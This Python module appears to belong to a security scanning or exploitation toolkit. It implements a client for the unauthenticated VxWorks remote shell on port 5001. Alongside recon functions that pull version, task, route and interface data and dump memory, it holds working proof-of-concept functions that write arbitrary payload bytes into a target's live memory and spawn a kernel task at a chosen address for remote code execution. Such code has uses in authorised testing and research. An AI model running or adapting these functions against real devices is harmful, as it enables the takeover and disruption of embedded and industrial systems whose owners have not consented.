"""
VxWorks shell client.

VxWorks shell listens on TCP/5001 (rsh/telnet-like).
Supports two modes:
  1. Recon: run `i` (task list), `version`, `memShow`, `routeShow`
  2. Exploit: use m() for arbitrary write, sp() to spawn a task (RCE)

VxWorks shell command reference:
  d(addr, n, w)    — memory dump: addr, n units, w width (1/2/4)
  m(addr, w)       — memory modify (interactive)
  l(addr)          — disassemble
  sp(func, a0, ..) — spawn task: RCE vector
  i                — task list
  ti(taskId)       — task info
  version          — kernel version
  memShow 1        — memory pool status
  routeShow        — route table (attack surface)
  ifShow           — network interfaces
"""

import socket
import time
from typing import Optional


VX_SHELL_PORT = 5001
_PROMPT       = b"->"

# Telnet IAC negotiation (strip these from responses)
_IAC = 0xFF


def _strip_telnet(data: bytes) -> bytes:
    """Strip IAC telnet negotiation sequences."""
    out = bytearray()
    i = 0
    while i < len(data):
        b = data[i]
        if b == _IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (0xFB, 0xFC, 0xFD, 0xFE):  # WILL/WONT/DO/DONT + option
                i += 3
                continue
            elif cmd == _IAC:
                out.append(_IAC)
                i += 2
                continue
        out.append(b)
        i += 1
    return bytes(out)


class VxShellClient:
    """TCP shell client for VxWorks remote shell."""

    def __init__(self, host: str, port: int = VX_SHELL_PORT,
                 timeout: float = 5.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._sock: Optional[socket.socket] = None

    def connect(self) -> bool:
        try:
            self._sock = socket.create_connection(
                (self.host, self.port), timeout=self.timeout)
            # Read banner / prompt
            self._read_until_prompt(timeout=3.0)
            return True
        except (OSError, socket.timeout):
            return False

    def _read_until_prompt(self, timeout: float = 5.0) -> bytes:
        self._sock.settimeout(timeout)
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self._sock.recv(1024)
                if not chunk:
                    break
                buf += chunk
                if _PROMPT in buf:
                    break
            except socket.timeout:
                break
        return _strip_telnet(buf)

    def run_cmd(self, cmd: str, timeout: float = 5.0) -> str:
        """Send a command and return the output up to the next prompt."""
        if self._sock is None:
            return ""
        try:
            self._sock.sendall((cmd + "\n").encode())
            response = self._read_until_prompt(timeout)
            return response.decode(errors="replace")
        except OSError:
            return ""

    def close(self):
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None


def probe_vx_shell(host: str, port: int = VX_SHELL_PORT,
                   timeout: float = 5.0) -> dict:
    """Probe for VxWorks shell; return finding dict for VX3d."""
    client = VxShellClient(host, port, timeout)
    try:
        if not client.connect():
            return {"status": "closed", "host": host, "port": port}

        result = {
            "status": "open",
            "host": host,
            "port": port,
            "unauthenticated": True,
            "severity": "CRITICAL",
            "note": "VxWorks shell provides unauthenticated arbitrary code execution",
        }

        ver_out = client.run_cmd("version")
        if ver_out:
            result["version_output"] = ver_out[:500]

        task_out = client.run_cmd("i")
        if task_out:
            result["task_list"] = task_out[:500]

        return result
    finally:
        client.close()


def shell_recon(host: str, port: int = VX_SHELL_PORT) -> dict:
    """Run a full recon sweep via the VxWorks shell."""
    client = VxShellClient(host, port)
    recon: dict = {"host": host, "port": port}
    try:
        if not client.connect():
            return {"error": "connect_failed"}

        for cmd in ("version", "i", "memShow 1", "routeShow", "ifShow",
                    "hostShow", "netDevShow"):
            out = client.run_cmd(cmd, timeout=8.0)
            if out:
                recon[cmd] = out[:1000]

        # Dump first 64 bytes at 0x0 via d() for memory layout confirmation
        recon["mem_dump_0x0"] = client.run_cmd("d 0,64,1", timeout=5.0)[:500]

        return recon
    finally:
        client.close()


def shell_arb_write_poc(host: str, target_addr: int,
                        payload: bytes, port: int = VX_SHELL_PORT) -> dict:
    """
    PoC: write payload to target_addr using VxWorks m() command.
    m(addr, width) enters interactive memory-modify mode; we simulate it
    by sending the bytes one word at a time.

    WARNING: This writes to live target memory.  For PoC confirmation only.
    """
    client = VxShellClient(host, port)
    try:
        if not client.connect():
            return {"status": "connect_failed"}

        written = 0
        for i in range(0, len(payload), 4):
            word = int.from_bytes(payload[i:i + 4].ljust(4, b"\x00"), "big")
            addr = target_addr + i
            cmd = f"m 0x{addr:08x},{word:#010x}"
            out = client.run_cmd(cmd, timeout=3.0)
            written += 4

        return {"status": "ok", "address": hex(target_addr),
                "bytes_written": written}
    finally:
        client.close()


def shell_spawn_task_poc(host: str, func_addr: int,
                         port: int = VX_SHELL_PORT) -> dict:
    """
    PoC: spawn a task at func_addr using VxWorks sp() command.
    sp(func, a0, a1, ...) — executes func in a new kernel task context.
    No NX means any writable address can be a code pointer.
    """
    client = VxShellClient(host, port)
    try:
        if not client.connect():
            return {"status": "connect_failed"}
        cmd = f"sp 0x{func_addr:08x}"
        out = client.run_cmd(cmd, timeout=5.0)
        return {"status": "executed", "func_addr": hex(func_addr),
                "output": out[:300]}
    finally:
        client.close()
